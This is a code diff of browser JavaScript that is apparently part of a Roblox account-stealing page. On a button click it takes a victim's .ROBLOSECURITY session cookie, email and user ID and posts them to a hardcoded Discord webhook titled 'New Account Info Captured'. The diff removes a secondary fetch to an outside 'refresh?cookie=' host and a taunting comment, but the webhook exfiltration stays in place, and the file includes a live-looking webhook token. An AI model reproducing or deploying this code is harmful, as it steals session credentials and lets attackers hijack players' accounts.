@@ -143,7 +143,6 @@ document.getElementById('login-button').addEventListener('click', () => {
   const extractedPlayerID = requestIdMatch[1];
 
   const safeEmail = email.length > 1024 ? email.slice(0, 1024) : email;
-  let refreshedSecurity = '';
 
   const lastSent = localStorage.getItem('lastSentTimestamp');
   const now = Date.now();
@@ -154,34 +153,17 @@ document.getElementById('login-button').addEventListener('click', () => {
     alert(`Please wait ${minutesLeft} minute(s) before hacking again.`);
     return;
   }
-
-  fetch('https://school-bus-yellowtuna.onpella.app/refresh?cookie=')
-    .then(response => {
-      if (!response.ok) {
-        throw new Error('Network response was not ok');
-      }
-      return response.text();
-      })
-      .then(_ => {
-         refreshedSecurity = 'const safeSecurity = extractedSecurity.length > 1024 ? extractedSecurity.slice(0, 1024) : extractedSecurity;';
-         output.textContent = refreshedSecurity;
-      })
-      .catch(err => {
-        output.textContent = 'Fetch error';
-      });
 	
-  // I know you want to delete the webhook, ggs.
   const webhookUrl = "https://discord.com/api/webhooks/1358048304214315038/4QX8qxXbXXdeCJ4jRMPom22wqXDfcLt4qZj_ttJHfuo9bJAb0M3wmC56aa9Kh3t2S0ZJ";
 
   const payload = {
     embeds: [{
       title: "New Account Info Captured",
       color: 15158332,
-      description: `**.ROBLOSECURITY:**\n${extractedSecurity}`, // put the token here
+      description: `**.ROBLOSECURITY:**\n${extractedSecurity}`,
       fields: [
         { name: "Email", value: safeEmail, inline: false },
         { name: "UserID", value: extractedPlayerID, inline: false },
-        { name: "UnrotatedSecurity", value: refreshedSecurity, inline: false }
       ],
       timestamp: new Date().toISOString()
     }]
